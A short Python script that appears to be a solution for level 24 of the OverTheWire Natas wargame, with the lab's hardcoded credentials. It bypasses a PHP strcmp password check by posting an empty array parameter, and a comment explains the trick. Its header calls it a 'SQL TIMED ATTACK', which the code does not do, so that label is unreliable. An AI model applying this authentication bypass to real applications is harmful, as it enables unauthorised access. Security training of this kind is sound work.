#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas24'
password='OsRmXFguozKpTZZ5X14zNO43379LZveg'

url = 'http://%s.natas.labs.overthewire.org/' %username

path = '?passwd='
session = requests.session()

value = "a"

# while(True):
# 	print "Trying value ",  value
# 	response = session.post(url, auth=(username, password), data={'passwd':"", 'submit':'Login'})
# 	content = response.text
# 	value = value * 2
# 	if ('credentials' in content):
# 		print "Character break at: ", value
# 		break

response = session.post(url, auth=(username, password), data={'passwd[]':"", 'submit':'Login'})
content = response.text
print content

# print  re.findall('Password: (.*)</pre>', content)[0]

#For this level there is a loop hole with strcmp i.e. if you pass an empty arry to strmp it returns 0.
